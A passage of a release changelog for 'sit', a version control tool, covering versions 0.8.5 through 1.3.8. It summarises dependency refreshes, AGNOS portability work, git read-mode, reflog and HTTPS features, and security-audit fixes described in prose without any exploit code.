| 1.3.8 | 2026-08-18 | **Deep audit — `sit merge` crashed on an ordinary merge, plus 14 more.** 10 auditors, every finding through 3 adversarial verifiers, then a completeness critic; 36 candidates → 29 confirmed. **CRITICAL:** `three_way_line_merge` never terminated on an insert-only hunk (one side appends, other prepends) → **SIGSEGV**, and dropped a side's edits where it survived. **HIGH:** ssh:// argument/remote-command injection (the promised whitelist was never called); HEAD symref traversal → arbitrary file write; `serve --stdio` completeness bypass → OOB inflate; remote Content-Length i64 overflow; `_wildmatch` backtracking (18-byte ignore file pinned a core); `config_file_set` 2 MB heap overflow; four unbounded walks. **MEDIUM:** unvalidated ids into a SQL literal; `.git/config` hash-algo substring scan silently reporting a clean tree as all-untracked to owl/thoth. 78 integration (was 70); regressions proven non-vacuous vs a 1.3.7 binary. 10 MEDIUM/LOW deferred to 1.3.9. Report: [`2026-08-18-audit.md`](../audit/2026-08-18-audit.md). |
| 1.3.7 | 2026-08-17 | **Hardening pass: two memory-safety defects in the git packfile reader.** Full P(-1) audit. The `.git/` pack reader was the one module with **no fuzz target**, and every serious finding landed there — the coverage gap and the defect cluster were the same place. **HIGH:** `_git_idx_lookup` trusted the `.idx` table geometry (object count, fanout search bounds, both offset tables all read from the file, then used as addresses) → **SIGSEGV reproduced three ways** on plain `sit cat-file`. **HIGH:** `_git_apply_delta`'s literal opcode bounds-checked its destination but not its source → a **127-byte heap disclosure incl. a live pointer**, returned as *success* and printed by `cat-file`. Both reachable read-only against any repo the user opens — which is the point of `.git/` mode (owl/thoth report on repos cloned from untrusted remotes). Six more guards closed as hardening; one LOW `refs/remotes/` guard off-by-one. New: 11-case hostile pack corpus with a positive control (proven non-vacuous by A/B — 4 cases fail pre-fix), 2 new fuzz harnesses, `src/lib/` (3.4 MB stale) removed, `run.sh` `$ROOT` shadowing fixed, `_serve_rehash_and_insert` double-scan consolidated. 282 unit / 70 integration / 9 fuzz / no bench regression. Report: [`2026-08-17-audit.md`](../audit/2026-08-17-audit.md). |
| 1.3.6 | 2026-08-17 | **cyrius `6.5.24` + deps to latest, and the four first-party layers stop being git deps.** A refresh whose substance is a packaging correction: `sakshi` / `sankoch` / `sigil` / `patra` are all folded into the cyrius stdlib snapshot, and the `[deps.<name>]` git pins sit carried for them were (a) **overriding** the fold for every consumer downstream — invisibly, since `deps --verify` reads the lock from disk and records the downgraded file's hash — and (b) making `distlib` **reclassify** the modules out of `dist/sit.deps`, so the sidecar omitted the three modules defining 27 symbols the bundle references. All four moved to `[deps].stdlib`; the toolchain pin is now the single version lever and the lock has zero commit pins. patra (1.13.0) and sigil (3.12.7) made the same change upstream. Each bump verified against its actual bundle diff: patra 1.12.12→1.13.0 is three hunks with **zero logic change** (no storage-format risk), sankoch 2.7.6→2.7.7 is **additive ZIP only** (compression core untouched), sigil's breaking `err_*` rename and its RSA verify bypass are both off sit's path (ed25519-only). Binary 14.84 MB → **2.84 MB** (sigil 3.12.9's `.bss` removal, inherited). 282 unit / 58 integration / fuzz / lint / audit / bench green; `--agnos` clean. Both dist profiles byte-identical to 1.3.5 apart from the version stamp — owl / thoth unaffected. **No behaviour change.** |
| 1.3.5 | 2026-07-31 | **sankoch `2.7.6` (>1 MiB object corruption) + cyrius `6.5.4` + AGNOS ssh-reap ABI.** Nominally a toolchain/dep refresh, but the sankoch bump carries a **silent data-corruption fix affecting every release ≤ 1.3.4**: sankoch ≤ 2.7.5's batch DEFLATE chunker resumed each 1 MiB block at `block_end` while the block encoder had legitimately overshot it by up to `LZ77_MAX_MATCH` (258) bytes, encoding the overshoot **twice** — so a *compressible* object over 1 MiB, written through sit's single `zlib_compress` call site ([`src/object_db.cyr:176`](../../src/object_db.cyr)), could land in the object store as a stream that decodes longer than its input and fails its own checksum. Both Huffman paths affected (sit compresses at level 6), so no level was a workaround. Data-dependent, not size-deterministic (needs an LZ77 match straddling a block boundary — incompressible >1 MiB content is fine); A/B-verified against both pins (2.5 MiB corrupt on 2.4.9, OK on 2.7.6; exactly 1 MiB fine either way). The `sp = block_end` defect is present in every sankoch back to the v0.8.x line, so **v0.8.0 – v1.3.4** could produce it. **Damage is at write time — upgrading does not repair existing repos**: `sit fsck` reports affected objects `unreadable` and counts them `bad`; `fsck --prune` refuses on `bad > 0`; recovery is re-adding the blob from the worktree or a good remote. Also newly reaching sit: sankoch 2.5.10 extended the 16 MiB `DECOMPRESS_MAX_OUTPUT` ceiling to cover stored (uncompressed) DEFLATE blocks, so a git packfile object over 16 MiB built from stored blocks now fails closed with `-ERR_OUTPUT_LIMIT` in [`src/git_pack.cyr`](../../src/git_pack.cyr) (clean read failure, never corruption; the other eight `zlib_decompress` sites already cap at 16 MiB and hit the buffer check first). cyrius `6.4.25 → 6.5.4` promotes syscall-arity mismatch from warning to **hard error** — which caught `wire_ssh_close`'s Linux-shaped 3-arg `sys_waitpid` (agnos declares 1 arg); the reap sits after 1.3.3's `#endif` and was missed, and since the arity check is static rather than reachability-based it had to go textually → wrapped in `#ifndef CYRIUS_TARGET_AGNOS`, completing the AGNOS syscall-ABI sweep started in 1.3.3 (ssh spawn) and 1.3.4 (FS). 6.5.4 also makes `sync` the sole `mutex_*` owner (three duplicate-symbol warnings gone; `thread` still required — sigil's `thread_join`, sandhi's channels) and re-resolves `cyrius.lock` 105 → 65 deps. Deps: sigil `3.10.0 → 3.12.2` (moves the crypto-bank off hardcoded thread-local slot 8, permanently closing a collision class with patra's slots 0–4 that sit was uniquely exposed to by linking both; requires cyrius ≥ 6.4.65), patra `1.12.9 → 1.12.12`, sakshi `2.4.4 → 2.4.7`; `[deps].stdlib` gains `thread_local` (declaration hygiene — an undeclared module of this class fails at *runtime*, the shape of the `random` SIGILL at v1.0.2). New `test_sankoch_zlib_large_object` pins the chunker boundary (512 KiB / 1 MiB / 2.5 MiB roundtrips) and is confirmed to fail on 2.4.9 / pass on 2.7.6 — the pre-existing zlib group compresses 88 bytes and never reached the chunker, which is why this survived to 1.3.4. 282 unit (273 → 282) / 58 integration / fuzz (7 harnesses) / `cyrius audit` green; `cyrius build --agnos` + DCE `--agnos` both OK. Both dist bundles regenerated but **byte-identical to 1.3.4 apart from version stamps** (3-line diff) — no public-API change, owl / thoth unaffected. `zlib-compress-65536B` 1.158 → 1.110 ms (~4% faster); decompress / sha256 / blob-hash flat. |
| 1.3.4 | 2026-07-08 | **AGNOS FS-syscall ABI + cyrius `6.4.25` + dep refresh.** Makes sit's low-level filesystem operations ABI-correct on AGNOS — they compiled `--agnos` (cyrius only warned on arity then) but silently miscompiled at runtime off Linux. agnos carries an explicit byte length and reorders flags (`sys_open(name, namelen, flags)`, `sys_stat(path, pathlen, statbuf)`, `sys_mkdir/rmdir/unlink(path, pathlen)`), so a Linux-shaped `sys_open(path, flags, mode)` landed `flags` in `namelen` with no `ud2` to catch it. Routed every path-taking site through the stdlib's portable length-carrying wrappers (`file_open` / `xstat` / `xunlink`, agnos-aware since cyrius 6.2.26) plus two sit-local bridges (`sit_mkdir` / `sit_rmdir`) for the shapes the stdlib doesn't cover: `src/util.cyr` (`sf_stat` / `sf_unlink` / `sf_mkdir` / `ensure_dir` / `sf_rmdir`), `src/sign.cyr` (signing-key create), `src/object_db.cyr` (owl tempfile + three `sys_unlink`), `src/wire_https.cyr` (known-hosts write), and `#ifdef CYRIUS_TARGET_AGNOS` branches for `src/validate.cyr`'s `path_is_symlink` / `path_lstat_kind` and `src/serve.cyr`'s serve-token perm check — agnos has no lstat, so symlink detection degrades to its following-`stat` (an accepted degradation matching darshini's fallback). Directory enumeration already carried an agnos branch and was left as-is. **Linux/macOS byte-identical** — every agnos branch is `#`-guarded and non-agnos falls through to the prior call. Deps: **patra `1.12.7 → 1.12.9`** is the last-mile unblock for the AGNOS object-write path — patra routes its five path-taking opens through the `file_open` ABI bridge instead of raw `sys_open` (which on AGNOS misread Linux flags as a byte length → `patra: cannot open or create file`), so `init` / `add` / `status` now run under mirshi on the AGNOS binary; sigil `3.9.9 → 3.10.0` (additive UEFI Authenticode PE signing, off sit's path), sankoch `2.4.8 → 2.4.9`, sakshi `2.4.3 → 2.4.4`. cyrius `6.4.21 → 6.4.25` clears the manifest-vs-`cycc` pin drift; `cyrius.lock` re-resolved (105 deps). 273/273 unit. Both dist profiles regenerated at 1.3.4. (Known residual: a patra readback under mirshi can still surface `patra: cannot read header` — `patra_hdr_read` expects a single full-page 16 KB `sys_read`, fragile against mirshi's partial reads; a patra/mirshi concern, not sit's call shape.) |
| 1.3.3 | 2026-07-08 | **AGNOS SSH-transport gating + cyrius `6.4.21`.** Closes the last AGNOS compile blocker in the wire layer: a `--agnos` build hard-failed at `undefined variable 'SYS_ACCESS'` in `src/wire_ssh.cyr`. 1.3.2 had made the whole library repo-root-relative; the one remaining Linux-ism was the SSH transport's `ssh`-binary spawn path (`fork` / `exec` / `access`), and AGNOS has none of those (its process model is `spawn` / `execwait`, not POSIX fork-exec) nor does AGNOS `sit` ever shell out to `ssh` — so the fix gates the spawn path out of the AGNOS build entirely. Two distinct gaps, gated two ways for two different reasons: `_ssh_find_binary`'s `access(2, X_OK)` executability probe is an **eager** name-resolution error (an undefined *variable* fires on every compiled fn, reachable or not) → `#ifndef CYRIUS_TARGET_AGNOS` removes the reference, preserving `access(X_OK)` semantics verbatim on Linux rather than weakening to an `open()` existence check; `wire_ssh_open`'s spawn body (`sys_fork` / `sys_dup2` / `sys_execve`) is statically **reachable** from `main` via `wire.cyr`, so a runtime early-return can't suppress the reachable-undefined-function error → the whole body is `#ifdef`'d to a clean `return 0` (ssh:// unsupported on AGNOS) with the prior code verbatim in the `#else`. **Linux behavior byte-identical.** cyrius `6.3.36 → 6.4.21`: the 6.4.x line adds the AGNOS syscall peer `lib/syscalls_x86_64_agnos.cyr` (6.4.2), so `sys_pipe` / `sys_close` / `sys_waitpid` / `sys_exit` now resolve under `--agnos`, and raises the `cyrius distlib` per-module read cap 256 KB → 1 MB (6.4.10); consumed surface unchanged and git-crate pins held; `cyrius.lock` re-resolved. 273 unit + integration pass, 0 failed; native and `--agnos` builds both green; the AGNOS binary runs under mirshi (`init` / `status` clean). serve capabilities stamp `1.3.2 → 1.3.3`; both dist bundles regenerated (`dist/sit.cyr` 13,620 lines, `dist/sit-read.cyr` 8,748 — the read profile was stale at 1.3.1 and is now re-synced). Unblocks `sit` in the agnos-dev docker image. |
| 1.3.2 | 2026-07-06 | **Repo-root-relative FS layer (fully AGNOS-native, no `chdir` anywhere).** Completes 1.3.1's chdir-free `sit_repo_open` into a full repo-root-relative FS layer — **all** of sit (object store, refs, index, reflog, serve, clone) resolves paths against an explicit repo root instead of the process cwd. AGNOS has no `chdir` / `getcwd` / `openat` (CWD is userland-owned), so this makes the **entire library AGNOS-compilable**, where a downstream `--agnos` build previously hard-failed at `SYS_CHDIR`. `src/util.cyr` gains `_repo_root` (0 = Linux default → no prefix), `sit_abs()` / `sit_abs_str()` as the single prefix point (absolute paths and the `.`/null root pass through unchanged), `sit_set_repo_root()`, and thin `sf_*` FS wrappers (`sf_exists` / `sf_write_all` / `sf_open` / `sf_read_all` / `sf_mkdir` / `sf_unlink` / `sf_rmdir` / `sf_stat` / `sf_dir_list` / `sf_patra_open`) that funnel repo-relative access through `sit_abs`; `ensure_dir` / `ensure_parent_dirs` / `read_file_heap` prefix internally. **~130 FS-access sites** across 16 `src/*.cyr` routed through the wrappers (name-swap, args unchanged), and **all 3 `syscall(SYS_CHDIR, …)` removed** — `serve` / `clone` now call `sit_set_repo_root(path)` and let `sit_abs` prefix; zero `SYS_CHDIR` remains. Behavior-preserving on Linux: `_repo_root` defaults 0 → `sit_abs` is a no-op → paths byte-identical; 273 unit / 58 integration / fuzz all pass, including the clone / push / shallow / `.git`-read lanes that open repos on *external* paths (exactly what the chdir→abs-path change touched). One post-refactor bug, CI-caught: the sweep routed the single-level `sf_dir_list` wrapper but missed the **recursive `dir_walk`** at three sites — `serve_emit_refs_subtree` (`src/serve.cyr`) plus `fsck_walk_refs_dir` / `fsck_collect_reflog_roots` (`src/object_db.cyr`) — each of which had a repo-root-relative `sf_exists` guard directly above a cwd-relative walk, so the guard passed while the walk read the process cwd and came up empty; `serve` advertised zero refs when its cwd wasn't the repo and SSH clone failed with `remote has no such branch`. Tests run with cwd = the repo so it never surfaced locally; the CI ssh-clone smoke (server cwd = `$HOME`) did. Each now walks `sit_abs(dir)`, verified out-of-cwd via `serve --stdio` (refs advertise, objects serve `200 OK`). `dist/sit.cyr` regenerated (deterministic). |
| 1.3.1 | 2026-07-03 | **chdir-free `sit_repo_open` (AGNOS-native read API).** `sit_repo_open` ([`src/api.cyr`](../../src/api.cyr)) dropped its `syscall(SYS_CHDIR, cwd)` and now reads the repo at the process's current working directory. AGNOS's frozen syscall floor has no chdir (nor `openat` / `getcwd`), so the raw `SYS_CHDIR` reference was a hard undefined-variable error whenever a Cyrius consumer compiled `dist/sit-read.cyr` for `--agnos` — regressing that consumer's AGNOS build lane (thoth's, which had to sed-neutralise the line in its vendored copy). The chdir was never load-bearing: every real consumer passes `sit_repo_open(".")`, where `chdir(".")` was already a no-op (owl's gutter markers, thoth's status bar, this repo's `git_probe` integration test), so removing it is **behavior-preserving** and makes the read profile AGNOS-native. API-contract change, non-breaking in practice: the `cwd` argument is now **advisory** — pass `"."`; reads are cwd-relative. To operate on a repo elsewhere, `chdir` into it before calling (the CLI already does this in its `cmd_*`). No consumer relied on the old chdir-by-path, so no migration; documented on the function and in [ADR 0009](../adr/0009-public-api-contract.md)'s stable surface. 273 unit / 58 integration unchanged, with `git_probe` verifying that the chdir-free open reads branch/status at cwd byte-correct vs `git`. serve capabilities banner and both dist profiles bumped to 1.3.1. |
| 1.3.0 | 2026-07-03 | **Read-only dist profile (`dist/sit-read.cyr`).** A lean `distlib` profile for consumers that only *report* on a repo — branch / status / diff — and never write or sync: thoth's status bar and owl's gutter markers. A new `[lib.read]` profile in `cyrius.cyml` (`cyrius distlib read`) emits **`dist/sit-read.cyr`** — the same public `sit_repo_*` API built from only the read path (util / validate / config / reflog / git_read / git_pack / object_db / index / refs / tree / diff / commit / merge / api), dropping the signing module and the whole network stack (sign / wire / wire_http / serve). 8.6k lines vs the full bundle's 13.5k. Motivated by a real consumer constraint: vendoring the *full* `dist/sit.cyr` into a Cyrius consumer drags in the network/serve code, which references stdlib globals a consumer's compile doesn't re-export (`serve`'s `HSV_REQ_BUF_SIZE`, TLS's `TLS_OK`) plus the unresolved `wire_ssh` transport symbols — forcing shim constants and tolerated wire warnings. The read profile references **none** of those (verified: 0 refs), so it compiles into a read-only consumer with no shims and no warnings. The cut is deliberately conservative: it **keeps** `reflog` / `index` / `commit` / `merge` because the read-only API genuinely reaches them — `sit_repo_status` honours `.gitignore` + the index, reading `HEAD` parses its commit object into a tree, and ref resolution consults the reflog — so dropping them would silently break status/diff; three `sign` symbols (`load_signing_seed` / `sign_commit_body` / `verify_commit_body`) remain unresolved as dead-path placeholders referenced only by `commit`'s signing path, the same shape as the full bundle intentionally leaving `wire_ssh` unresolved. **No behavior or API change** — the only source edit is the mandatory per-release `serve_build_capabilities()` version stamp (CI-asserted == VERSION); the cut itself is manifest-driven, and the full `dist/sit.cyr` is otherwise unchanged and remains the default for consumers needing the write/sync surface. Verified downstream: thoth vendors `dist/sit-read.cyr` (plus sankoch as its own dep) and builds clean — no shim, no wire warnings, no `too many initialized globals`; this is the artifact thoth's `0.13.0` git producer consumes. 273 unit / 58 integration / fuzz / lint green, unchanged from 1.2.0 — the read profile is a subset of already-covered, already-audited modules. Resequencing: the annotated/signed-tags + ref-ergonomics work previously earmarked for 1.3.0 moves to **1.4.0** (see [roadmap](roadmap.md)). |
| 1.2.0 | 2026-07-03 | **`.git/` read-mode.** Reads an existing git repo (SHA-1 + SHA-256) **read-only** through the same public API as `.sit/` repos — loose objects + **packfiles** (`.idx` v2 + a first-party OFS/REF delta interpreter, recursive chains) + refs (`HEAD`/`refs/`/`packed-refs`) — via a storage seam (`sit_repo_open` sets a backend; `read_object`/`read_head_ref`/`resolve_ref_name` dispatch; width centralised in `_id_hexlen`/`_id_rawlen`). New public `sit_repo_branch` + `sit_repo_status` (HEAD-vs-worktree, honours `.gitignore`) + `sit_status_path`/`sit_status_kind`; `sit_diff_path` now works on git; CLI `cat-file`/`owl-file` git-aware. New modules `src/git_read.cyr` + `src/git_pack.cyr` (`[lib].modules`, before `object_db.cyr`); [ADR 0011](../adr/0011-git-read-mode.md), scoping [ADR 0004](../adr/0004-sha256-only.md). Read-only (no write-back); SHA-1 never computed. Folds in cyrius `6.2.44 → 6.3.36` + deps (sakshi 2.4.3 / sankoch 2.4.8 / sigil 3.9.9 / patra 1.12.7; stdlib `+sync`). 273 unit / 58 integration (loose + packed depth-5 deltas + refs + packed-refs + SHA-256 + a `dist/sit.cyr` library-API probe) / fuzz / lint green; validated byte-for-byte vs `git`. `dist/sit.cyr` regenerated. Single static binary, no dynamic deps. |
| 1.1.0 | 2026-06-25 | **Reflog + recovery.** First post-1.0 minor. **Git-compatible reflog** at `.sit/logs/` (per-ref logs; git-format line; HEAD-on-branch moves log twice; tags not logged) across commit/reset/merge/checkout/branch-create/clone/pull/fetch. **`<ref>@{N}`/`HEAD@{N}`** resolution everywhere a revision is accepted (`reset --hard HEAD@{1}` = undo last reset). New **`sit reflog [-n <count>] [<ref>]`** (inventory → 27). **`fsck --prune` grace**: reflog oids are roots + 90-day age window (commits by author ts; undatable trees/blobs kept); `--prune-now` = legacy immediate. `--prune` no longer immediate (behaviour change; migrate to `--prune-now`). New module `src/reflog.cyr` (`[lib].modules`, before `object_db.cyr`); [ADR 0010](../adr/0010-reflog-and-recovery.md) + [arch 005](../architecture/005-reflog-two-line-invariant.md). Pre-ship multi-agent adversarial review fixed 11 issues (identity/label/output sanitization, `branch -d` reflog cleanup, undatable-commit prune symmetry, single-timestamp-per-move, corrupt-roots tripwire). 273 unit / 46 integration; fuzz (7 harnesses incl. `reflog_index`) / lint / bench green; new CI reflog+recovery+prune-grace smoke. `dist/sit.cyr` regenerated. DCE binary **2.375 MB** (+~126 KB vs 1.0.4). No toolchain/dep change. |
| 1.0.4 | 2026-06-25 | **Ed25519 server certs + 1.0.x hygiene.** No new surface. **Ed25519 `sit serve --tls`** consumed — the parked `tls_native` gap (issue 2026-06-10) is fixed upstream (sigil 3.9.x X.509 parser, folded into cyrius 6.x); sit needed no code change (cert-algorithm-agnostic). https CI smoke now exercises Ed25519 + ECDSA P-256; getting-started caveat dropped; issue archived. **serve capabilities banner** un-drifted (`0.8.10` → tracks VERSION) + new CI guard asserting banner == VERSION. **clone host-scan** hardened (`break`-after-`var` → flag loop; verified default-dir derivation). Comment/string accuracy sweep (stale `v0.7.3`/`0.8.10`/keep-alive refs). Still parked: patra `or_ignore`/P-11, sankoch `ratio_cap`/SIMD, sigil strict `hex_decode`. 230/230 unit; 40/40 integration; lint/fuzz/bench green; Ed25519 + ECDSA P-256 https clones verified e2e. `dist/sit.cyr` regenerated. DCE binary **2.249 MB** flat vs 1.0.3. No toolchain/dep change. |
| 1.0.3 | 2026-06-25 | **cyrius 6.2.44 toolchain refresh + dep bumps.** cyrius `6.2.25 → 6.2.44`. Deps: sakshi `2.4.0 → 2.4.2`, sigil `3.9.1 → 3.9.4`, patra `1.12.0 → 1.12.4` (sankoch held at `2.4.4`, already latest). One source change: the 6.2.44 stdlib retired `fl_free`'s second `size` argument, so 30 call sites in `serve.cyr` / `wire_http.cyr` / `wire_ssh.cyr` went `fl_free(ptr, cap)` → `fl_free(ptr)` (allocator tracks size internally; no behavior change; clears 30 build warnings). No surface change. 230/230 unit; lint/fuzz/bench green; sigil audit clean (keygen → signed commit → verify e2e). `dist/sit.cyr` regenerated (`serve.cyr` + `wire_http.cyr` are `[lib].modules`). DCE binary **2.249 MB** (+~4 KB vs 1.0.2). |
| 1.0.2 | 2026-06-19 | **cyrius 6.2.25 toolchain refresh + dep bumps.** Toolchain/dep refresh (same shape as v0.8.11 / v0.8.6). cyrius `6.2.2 → 6.2.25`. Deps: sakshi `2.3.0 → 2.4.0`, sankoch `2.3.1 → 2.4.4`, sigil `3.7.13 → 3.9.1`, patra `1.11.1 → 1.12.0`. No `src/*.cyr` changes. **`[deps].stdlib` gains `random`**: sigil 3.9.1 routes ed25519 keygen entropy through stdlib `random_bytes` (`lib/random.cyr`); without it `sit key generate` crashed SIGILL (exit 132). Remaining benign DCE-stripped warnings: four `async_*` undefined refs + a `SANDHI_CONN_OFF_FD` duplicate-symbol (from vendored `lib/sandhi.cyr`). 230/230 unit; lint/fuzz green; sigil audit clean (keygen → signed commit → verify e2e). `dist/sit.cyr` version-stamp bump only. DCE binary **2.245 MB** (+~38 KB vs 1.0.1 — 6.2.25 stdlib/dep heft). |
| 1.0.1 | 2026-06-13 | **diff: large-file Myers fallback + minimality fix.** First 1.0.x patch, no new surface. Fixed: `lcs_diff` now zeroes its DP base row/col (it relied on `fl_alloc` zeroing — only true for fresh mmap pages; a recycled freelist table produced non-minimal diffs on the 2nd+ diff in a process). Added: `myers_diff` (P-14) diffs files past the 8192/dim DP cap (was refused) via bounded greedy Myers, same op-tuple format. Tests: +50 unit (Myers differential, 230 total) + ADR-0003 no-upward-discovery + 9000-line e2e (40 integration). DCE 2.208 MB. No public-API/toolchain/dep change. |
| 1.0.0 | 2026-06-13 | **Sovereign version control, 1.0 — the first stable release.** Ceremonial cut on a green v0.9.0 (no code changes; version stamp only). Marks the full git-parity surface (26 commands; signing; fsck integrity/reachability/prune; git-parity `.sitignore`; log --graph; shallow clone; file/http/https/ssh sync; library export) and the SemVer stability commitment for the CLI, `.sit/` layout, wire protocol, and `sit_*`/`ann_*` public API. Single static binary, no dynamic deps (`ldd` → not a dynamic executable). 180 unit / 33 integration; fuzz/bench/lint green; DCE 2.204 MB. Cyrius 6.2.2; sakshi 2.3.0 / sankoch 2.3.1 / sigil 3.7.13 / patra 1.11.1. |
| 0.9.0 | 2026-06-13 | **v1.0.0 closeout / stabilization.** No features. Independent adversarial review of the v0.8.x additions found 3 HIGH bugs, all fixed + regression-tested: `log --graph` OOB write (`_graph_join_connector` seam underflow at column 0 — reachable when a merge's 2nd parent is strictly newer), `fsck --prune` data-loss (could delete reachable objects orphaned behind a corrupt object — now refused on `bad>0` / all-dangling), `find_merge_base` cyclic-store fallback. Dead-code sweep (removed 2 unused ssh getters). Refactor: `commit_parents_of` consolidates parent-walk boilerplate. Public API byte-identical (owl unaffected). Audit `docs/audit/2026-06-13-audit.md`. 180 unit / 33 integration; fuzz/bench/lint green; bench flat vs v0.8.12; DCE 2.204 MB (−336 B). No toolchain/dep change. |
| 0.8.14 | 2026-06-13 | **`sit fsck --prune`.** Removes the dangling (unreachable) objects the v0.8.5 reachability walk identifies — new `db_object_delete` (hex-validated `DELETE FROM objects`), `patra_flush` for cross-process durability, `pruned <n> objects` report. Refused while a merge is in progress (`.sit/MERGE_HEAD`). Immediate + unrecoverable (no reflog yet → `git gc --prune=now` semantics, documented). Verified: `reset --hard` → 3 dangling → prune → fresh fsck 0 dangling, reachable history + working tree intact; MERGE_HEAD refusal. 180 unit / 30 integration; lint/fuzz/bench green; dist regenerated; DCE 2.20 MB flat. No toolchain/dep change. |
| 0.8.13 | 2026-06-13 | **`merge_base` full-DAG LCA + `sit merge-base`.** `find_merge_base` rewritten to compute a true lowest-common-ancestor over the `out+48` parent graph (ancestor-set + prune-BFS frontier + redundancy reduction via `is_ancestor`), correcting `sit merge`'s 3-way base across merge-bearing history — the old single-first-parent walk fell back to root in any diamond. New `sit merge-base <a> <b>` plumbing (git parity; 26 commands). Verified on a diamond fixture (true base B, not root R) + self/ancestor identities. Closes the last v0.8.7-era single-parent footgun. Criss-cross picks one base (documented). 180 unit / 22 integration; lint/fuzz/bench green; dist regenerated; DCE 2.20 MB flat. No toolchain/dep change. |
| 0.8.12 | 2026-06-13 | **`log --graph` + `--depth N` shallow clone + bench/test infrastructure.** `sit log --graph` renders an ASCII commit DAG (full-DAG walk via out+48, position-grid `* | / \` lanes, deterministic reverse-topological emission). `sit clone --depth N` shallow-clones (depth-capped `walk_reachable_phased` + `.sit/shallow` marker; `--depth 1` = 3 objects, `log` stops cleanly, fsck-clean). Bench harness refreshed (fixed stale `copy_objects`; added LCS-diff / `is_ignored` / blob-hash groups) → `cyrius bench` a per-release gate again, baseline `docs/benchmarks/2026-06-13-v0.8.12.md`. New in-tree integration suite (`tests/integration/run.sh`, 19 assertions) + CI step. Documented `--graph` spacing + merge-shallow simplifications. 180 unit / 19 integration; lint/fuzz/bench green; dist regenerated; DCE 2.20 MB. No toolchain/dep change. |
| 0.8.11 | 2026-06-13 | **cyrius 6.2.2 toolchain refresh + dep bumps.** Pins-only release (same shape as v0.8.6). cyrius `6.1.30 → 6.2.2`. Deps: sakshi `2.2.10 → 2.3.0`, sankoch `2.3.0 → 2.3.1`, sigil `3.7.8 → 3.7.13`, patra `1.11.0 → 1.11.1`. No sit source changes; `[deps].stdlib` unchanged. Four `async_*` warnings remain benign (DCE-stripped). 180/180 tests; lint/fuzz green; sigil audit clean (signed-commit verify e2e). `dist/sit.cyr` version-stamp bump only. DCE binary **2.19 MB** (+~44 KB vs v0.8.10 — 6.2.x stdlib/dep heft). |
| 0.8.10 | 2026-06-10 | **Full `.sitignore` semantics (git-parity).** New `_wildmatch` (WM_PATHNAME glob: `*`/`?`/`[...]` char classes/`**`/dir-exclusion) replaces single-segment `glob_match`; `is_ignored` does last-match-wins so `!pattern` re-includes; `load_sitignore` flags anchoring (leading/middle `/`) + `\!`/`\#` escapes; pattern storage cstrings → struct vec. 180 assertions (+34: `_wildmatch` glob-core + negation/anchoring groups) + `Smoke — .sitignore semantics` CI fixture. Documented simplifications (non-segment `**` crosses `/`; trailing-`/` dir-only not enforced). No pin change. 180 tests; lint/fuzz green; DCE 2.15 MB. |
| 0.8.9 | 2026-06-10 | **HTTPS followups: push + keep-alive + read-timeout + CI smoke.** `sit push` over `https://` (writable-check + `_url_is_http_family` dispatch; push primitives were already TLS-aware). **Keep-alive**: persistent socket+ctx reused across a clone/fetch/push — one TLS handshake instead of one-per-object (verified: 15-object clone = 1 handshake); `_wire_https_exchange` reads by exact Content-Length, `_serve_run_tls` loops per connection with `Connection: keep-alive`. 30s `SO_RCVTIMEO` both ends (slowloris bound). New `Smoke — https transport` CI step (serve --tls + clone https + fsck + TOFU pin/mismatch). Filed the Ed25519-server-cert `tls_native` gap (ECDSA P-256 works). Pin `6.1.29 → 6.1.30`. 146 tests; lint/fuzz green; DCE 2.14 MB flat. |
| 0.8.8 | 2026-06-10 | **HTTPS transport — `https://` clone/fetch over first-party TLS 1.3 (the long-blocked v0.8.x slot).** cyrius 6.x's `lib/tls_native.cyr` (pure-Cyrius TLS 1.3, no libssl) closes ADR 0007's gate. Three bites: (1) TOFU pin store in new `src/wire_https.cyr` (SPKI SHA-256 in `~/.sit/known_certs`, ADR 0008 parity); (2) client TLS I/O in `wire_http.cyr`; (3) server TLS in `serve.cyr` (`sit serve --tls --cert --key` + hand-rolled accept loop + 67 send sites routed via `_serve_tls_ctx`-gated wrappers). Validated e2e: clone https:// against serve --tls (ECDSA P-256), TOFU-pinned, fsck-clean; interops with OpenSSL 3.6.2; mismatch refuses. `tls_native` added to stdlib; toolchain pin `6.1.27 → 6.1.29` (the validated version). Read-only; https push + keep-alive + read-timeout queued for 0.8.9. 146 tests; lint/fuzz green; DCE 2.14 MB. |
| 0.8.7 | 2026-06-10 | **Wire-walker multi-parent fix (v0.7.6-era footgun #3 closed).** `parse_commit_body` captured only the last `parent` header; the three traversals consuming it (`walk_reachable_phased`, `is_ancestor`, `is_ancestor_in_db`) followed one edge per merge. Clone/fetch/push of a merge-bearing repo silently dropped the first-parent subgraph (verified 11 → 9 objects) while still passing `sit fsck`. Fix: `parse_commit_body` exposes every parent via a vec at `out+48` (last parent stays at `out+8` so `cmd_log` / `merge_base` are byte-identical); the three traversals enqueue all of them; `is_ancestor` rewritten as a full-DAG BFS. New `tests/sit.tcyr` multi-parent group; 138 assertions. `merge_base` single-parent LCA left as a tracked follow-up. Lint/fuzz green; DCE binary 2.12 MB (+672 B). |
| 0.8.6 | 2026-06-10 | **cyrius 6.1.27 toolchain refresh + dep bumps + stdlib reorg.** cyrius `5.11.55 → 6.1.27` (6.x major). Deps: sakshi `→2.2.10`, sankoch `→2.3.0`, sigil `→3.7.8`, patra `→1.11.0`. Stdlib reorg: `bigint`/`base64`/`json` → `bayan` omnibus; `slice` added. `async` omitted (sandhi async server variant is dead code; adding it overflows the 256-global cap — 4 benign `async_*` warnings DCE-stripped). No sit source changes. **`tls_native` unblock**: cyrius 6.x ships pure-Cyrius TLS 1.3 (`lib/tls_native.cyr`), clearing ADR 0007's HTTPS gate. 127/127 tests; DCE binary 2.12 MB (up from 1.39 MB — 6.x stdlib heft). Shipped undocumented; recorded retroactively. |
| 0.8.5 | 2026-05-15 | **`sit fsck` reachability walk + cyrius 5.11.55 toolchain refresh (v0.7.6 footgun #2 closed).** `cmd_fsck` output gains a third counter and per-object dangling lines: `dangling <type> <hex>` + `checked N objects, M bad, D dangling`. Walker is BFS from every root (refs/heads + tags + remotes via `dir_walk`, detached HEAD, plus every staging-index blob via `parse_index` + `hex_encode(entry_hash(e), 32)`) and follows **every** `parent` line on commits via the new `fsck_collect_commit_parents` — distinct from `parse_commit_body` which captures only the last `parent` (a pre-existing limitation that fetch/clone inherits but fsck explicitly does not). New helpers in `src/object_db.cyr`: `fsck_walk_reachable`, `fsck_collect_roots`, `fsck_collect_commit_parents`, `fsck_extract_commit_tree`, `fsck_read_ref_tip`, `fsck_walk_refs_dir`, `fsck_ty_word`. Integrity SELECT widened to `(hash, ty)` so the dangling pass can name the type without a second read. Dangling objects do NOT fail the command (git policy: resets 